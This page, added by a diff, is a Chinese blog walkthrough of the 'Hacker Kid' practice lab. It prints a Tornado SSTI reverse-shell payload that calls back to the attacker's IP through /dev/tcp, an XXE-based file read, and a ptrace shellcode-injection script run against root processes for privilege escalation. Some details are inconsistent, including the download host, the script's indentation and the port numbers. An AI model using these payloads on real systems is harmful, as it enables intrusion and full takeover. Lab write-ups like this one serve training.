@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hacker Kid | 灰太狼</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="我一定会回来的">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="灰太狼" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">灰太狼</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Hacker-Kid" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Hacker Kid
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2023-11-16T03:19:15.000Z" itemprop="datePublished">2023年11月16日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2023/11/16/Hacker-Kid/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Hcaker-Kid-渗透测试"><a href="#Hcaker-Kid-渗透测试" class="headerlink" title="Hcaker Kid 渗透测试"></a>Hcaker Kid 渗透测试</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Hack Kid靶场</p>
+<p>攻击机：kali</p>
+<p>攻击机IP地址：192.168.43.129</p>
+<p>网卡配置：NAT模式</p>
+<span id="more"></span>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>查看存活主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116120944119.png" alt="image-20231116120944119"></p>
+<p>发现存活主机IP地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.143</span><br></pre></td></tr></table></figure>
+
+<p>查看此IP开放的端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.43.143 -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116121326781.png" alt="image-20231116121326781"></p>
+<p>发现有三个端口</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>访问80：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116121608627.png" alt="image-20231116121608627"></p>
+<p>看返回的页面竟然是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;More you will DIG me,more you will find me on your servers..DIG me more...DIG me more&quot; </span><br></pre></td></tr></table></figure>
+
+<p>挖掘dig命令，稍后尝试，接下来查看另一个开通web服务的端口</p>
+<p>访问9999</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116122016209.png" alt="image-20231116122016209"></p>
+<p>发现有一个用户名和密码，login后面的next可提交参数，可能会有sql注入漏洞，进行尝试：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116123817682.png" alt="image-20231116123817682"></p>
+<p>使用sqlmap跑了之后发现next参数后面并不存在注入点，</p>
+<p>查看9999端口的源代码无任何提示，转战80端口，查看源代码：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116124421933.png" alt="image-20231116124421933"></p>
+<p>发现使用get提交参数的方法，page_no作为参数抓包查看网页，尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.143/?page_no=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116171758315.png" alt="image-20231116171758315"></p>
+<p>这说明page_no后面的参数不对，不确定是啥那就使用bp爆破，数值爆破1-100之内</p>
+<p>参数后常用数值：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116171221930.png" alt="image-20231116171221930"></p>
+<p>使用bp爆破：</p>
+<img src="/2023/11/16/Hacker-Kid/image-20231116171359602.png" alt="image-20231116171359602" style="zoom:67%;">
+
+<p>爆破结果发现序号为21的长度与其他的不同</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116171450967.png" alt="image-20231116171450967"></p>
+<p>那page_no的数值即为21，尝试访问</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116171925770.png" alt="image-20231116171925770"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Okay so you want me to speak something ?</span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!</span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br><span class="line">好吧，你想让我说点什么吗？</span><br><span class="line">我是一个黑客孩子，而不是一个愚蠢的黑客。所以我创建了一些子域，随时可以返回服务器！！</span><br><span class="line">在我的许多家里。。。一个这样的家。。我有一个这样的家：hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+<p>查看之后发现回显了一个子域名，尝试访问一下发现还不能解析到目标IP地址，感觉自己直接访问hackers.blackhat.local这个域名属实优点“白”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们在hosts中添加一条解析记录，将hackers.blackhat.local解析到192.168.2.174这个地址</span><br><span class="line">192.168.43.143 hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在这里使用DNS协议的axfr，客户端请求将blackhat.local 的整个区域全部记录进行传送，在这里我们拿到了多个域名信息</span><br><span class="line">dig axfr @192.168.43.143 hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+<p>我们拿到了他其中一个子域名，我们使用dig工具反向查一下其他的子域名：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116173514985.png" alt="image-20231116173514985"></p>
+<p>将这两个域名放到hosts文件当中</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116174059146.png" alt="image-20231116174059146"></p>
+<p>刷新服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/networking restart            </span><br></pre></td></tr></table></figure>
+
+<p>访问第二个域名：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116174401798.png" alt="image-20231116174401798"></p>
+<p>创建账户的时候发现邮箱一直不能用</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116181726017.png" alt="image-20231116181726017"></p>
+<p>实在不行，那就进行抓包看一看</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116181842147.png" alt="image-20231116181842147"></p>
+<p>就是邮箱不能得到，但是现在知道了他这里用了XML作为http报文的body，猜测存在XXE漏洞</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们先抓包提交一个正常的，然后改包测试看看：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116182038084.png" alt="image-20231116182038084"></p>
+<p>发现email这个参数能够回显，接下来插入我们的XXE Payload:</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116182328166.png" alt="image-20231116182328166"></p>
+<p>发送，查看回显：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116182354969.png" alt="image-20231116182354969"></p>
+<p>发现了一个用户：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116182750465.png" alt="image-20231116182750465"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">saket: 这是用户名。</span><br><span class="line">x: 这个字段包含加密的密码信息。在现代系统中，密码通常被加密并存储在 /etc/shadow 文件中，所以这里显示一个 &#x27;x&#x27; 表示密码已经被加密并存储在另一个文件中。</span><br><span class="line">1000: 这是用户的唯一标识号（UID）。</span><br><span class="line">1000: 这是用户所属的主要组的唯一标识号（GID）。</span><br><span class="line">Ubuntu..: 这是用户的注释或者描述信息。</span><br><span class="line">/home/saket: 这是用户的家目录路径。</span><br><span class="line">/bin/bash: 这是用户登录时使用的默认 shell。</span><br></pre></td></tr></table></figure>
+
+<p>可见saket有家目录和shell，即为可登录用户。</p>
+<p>极为丰富，接下来访问一下.bashrc文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了加载你的配置，bash 在每次启动时都会加载 .bashsrc 文件的内容。每个用户的 home 目录都有这个 shell 脚本。它用来存储并加载你的终端配置和环境变量。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116183741423.png" alt="image-20231116183741423"></p>
+<p>发现根本不成功，那就换中方式，&#x2F;etc&#x2F;passwd可以读出来，那就代表方向没错，换种方式，防止被过滤掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将其通过base64编码后返回，这里用到php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116184111945.png" alt="image-20231116184111945"></p>
+<p>发现成功了，但是这都是编码过的，所以对其解码，查看内容：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116184927355.png" alt="image-20231116184927355"></p>
+<p>出现了username和password，之前知道9999端口有一个账户密码登陆页面，尝试登陆</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116185150054.png" alt="image-20231116185150054"></p>
+<p>错误，查看&#x2F;etc&#x2F;passwd中发现没有admin用户，所以不是这里的登录账户和密码，那我用一下username&#x3D;saket试试</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116190225221.png" alt="image-20231116190225221"></p>
+<p>终于登陆成功了，发现他说需要一个name参数，那就给一个name参数和123值尝试：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116190347843.png" alt="image-20231116190347843"></p>
+<p>什么值就返回什么值。</p>
+<p>我们结合前面nmap中扫描的结果（9999端口，Tornado）猜测存在服务器端模板注入漏洞（SSTI）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br></pre></td></tr></table></figure>
+
+<p>先行尝试一个运算表达：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116191132020.png" alt="image-20231116191132020"></p>
+<p>那就利用服务器端模板注入漏洞（SSTI）进行shell的反弹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt; /dev/tcp/192.168.43.129/4321 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是在bp当中需要进行特殊字符编码：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116191450307.png" alt="image-20231116191450307"></p>
+<p>查看keli是否反弹成功：</p>
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116191543142.png" alt="image-20231116191543142"></p>
+<p>反弹成功！</p>
+<h2 id="Capabilitie提权"><a href="#Capabilitie提权" class="headerlink" title="Capabilitie提权"></a>Capabilitie提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。 这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。 如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</span><br></pre></td></tr></table></figure>
+
+<p>查看具有Capabilities特殊操作权限的程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/dev/null=linux的垃圾桶</span><br><span class="line">2=错误模式输出后面可以理解为如果有错误报告会直接删除不会显示</span><br><span class="line">/sbin=超级用户指令系统管理命令，这里存放的是系统管理员使用的程序</span><br><span class="line">/getcap -r = 查找setcap所设置的文件</span><br></pre></td></tr></table></figure>
+
+<p>在kali上编辑以下代码，并起名为exp.py，打开http服务，并利用靶机进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali：python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机：wget http://192.168.43.143/exp.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"> </span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"># Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"> </span><br><span class="line">PTRACE_POKETEXT   = 4</span><br><span class="line">PTRACE_GETREGS    = 12</span><br><span class="line">PTRACE_SETREGS    = 13</span><br><span class="line">PTRACE_ATTACH     = 16</span><br><span class="line">PTRACE_DETACH     = 17</span><br><span class="line"> </span><br><span class="line"># Structure defined in &lt;sys/user.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"> </span><br><span class="line">class user_regs_struct(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line">    </span><br><span class="line">    pid=int(sys.argv[1])</span><br><span class="line">    </span><br><span class="line">    # Define argument type and respone type.</span><br><span class="line">    libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">    libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line">    </span><br><span class="line">    # Attach to the process</span><br><span class="line">    libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">    registers=user_regs_struct()</span><br><span class="line">    </span><br><span class="line">    # Retrieve the value stored in registers</span><br><span class="line">    libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line">    </span><br><span class="line">    print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line">    </span><br><span class="line">    print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line">    </span><br><span class="line">    # Shell code copied from exploit db.</span><br><span class="line">    shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line">    </span><br><span class="line">    # Inject the shellcode into the running process byte by byte.</span><br><span class="line">    for i in xrange(0,len(shellcode),4):</span><br><span class="line">        </span><br><span class="line">        # Convert the byte to little endian.</span><br><span class="line">        shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line">        shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line">        shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line">        </span><br><span class="line">        # Inject the byte.</span><br><span class="line">        libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line">        </span><br><span class="line">        print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line">        </span><br><span class="line">        # Modify the instuction pointer</span><br><span class="line">        registers.rip=registers.rip+2</span><br><span class="line">        </span><br><span class="line">        # Set the registers</span><br><span class="line">        libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line">        </span><br><span class="line">        print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line">        </span><br><span class="line">        # Detach from the process.</span><br><span class="line">        libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure>
+
+<p>因需要root进程进行注入，编写脚本对root进程批量尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#x27;&#123;print $2&#125;&#x27;`; do python2.7 exp.py $i; done</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这是一个 Bash 命令，用于列出当前运行进程中包含 &quot;root&quot; 关键词的进程，并对其执行 Python 2.7 脚本 exp.py，并传递进程的 ID 作为参数。</span><br><span class="line"></span><br><span class="line">让我逐步解释：</span><br><span class="line"></span><br><span class="line">ps -ef: 列出系统上所有进程的详细信息。</span><br><span class="line">grep root: 从所有进程中筛选出包含 &quot;root&quot; 的行。</span><br><span class="line">grep -v &quot;grep&quot;: 排除包含 &quot;grep&quot; 的行，以避免匹配到自身 grep 命令的行。</span><br><span class="line">awk &#x27;&#123;print $2&#125;&#x27;: 使用 AWK 提取每行的第二列（进程ID）。</span><br><span class="line">反引号 `...`: 将命令的输出（筛选出的进程ID）作为循环的输入。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/16/Hacker-Kid/image-20231116194356633.png" alt="image-20231116194356633"></p>
+<p>脚本执行成功，开始监听</p>
+<p>kali开始监听，使用shell也开始监听5600</p>
+<p> <img src="/2023/11/16/Hacker-Kid/image-20231116194610607.png" alt="image-20231116194610607"></p>
+<p> <img src="/2023/11/16/Hacker-Kid/image-20231116194719851.png" alt="image-20231116194719851"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>dig挖掘可以通过一个域名，反查其他的子域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig 域名1 @IP地址</span><br></pre></td></tr></table></figure>
+
+<p>kali修改DNS域名解析的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">增加的模式为：</span><br><span class="line">IP地址 域名</span><br></pre></td></tr></table></figure>
+
+<p>windows 11系统修改DNS域名的方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>
+
+<p>该路径中的hosts文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了加载你的配置，bash 在每次启动时都会加载 .bashrc 文件的内容。每个用户的 home 目录都有这个 shell 脚本。它用来存储并加载你的终端配置和环境变量。</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;etc&#x2F;passwd当中的信息，谁是可登录的用户用以下信息证明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存在登录 shell： 当一个用户拥有一个可用的 shell（例如 /bin/bash）时，通常被认为是一个可登录的用户。Shell是用户与系统进行交互的界面，允许用户登录并执行命令。</span><br><span class="line">有家目录： 用户的家目录路径也是判断用户是否可以登录的一个重要指标。家目录是用户在登录后的默认工作目录，如果用户具有指定的家目录路径，则表明他们具备登录所需的基本环境。</span><br></pre></td></tr></table></figure>
+
+<p>没有上传system木马也能反弹shell：服务器端模板注入漏洞（SSTI）</p>
+<p>这次的越权反弹吸收了知识了，运行python脚本之后，使用kali去连接靶机的指定端口，这个root进程的端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">natstat -lntp：这部分命令执行 natstat 工具，用于列出当前网络连接的信息。选项 -lntp 是用来过滤和显示连接信息的标志。这些选项的含义是：</span><br><span class="line">-l：显示监听中的连接。</span><br><span class="line">-n：以数值格式显示，不进行域名解析。</span><br><span class="line">-t：显示 TCP 协议相关的连接信息。</span><br><span class="line">-p：显示连接对应的进程/程序名。</span><br><span class="line">|：这个符号是管道操作符，将 natstat -lntp 命令的输出传递给下一个命令。</span><br><span class="line">grep 5666：grep 是一个用于在文本中搜索指定模式的命令。在这个上下文中，它搜索由 natstat -lntp 输出的结果，并仅显示包含 5666 的行，也就是与端口 5666 相关的连接信息。</span><br></pre></td></tr></table></figure>
+
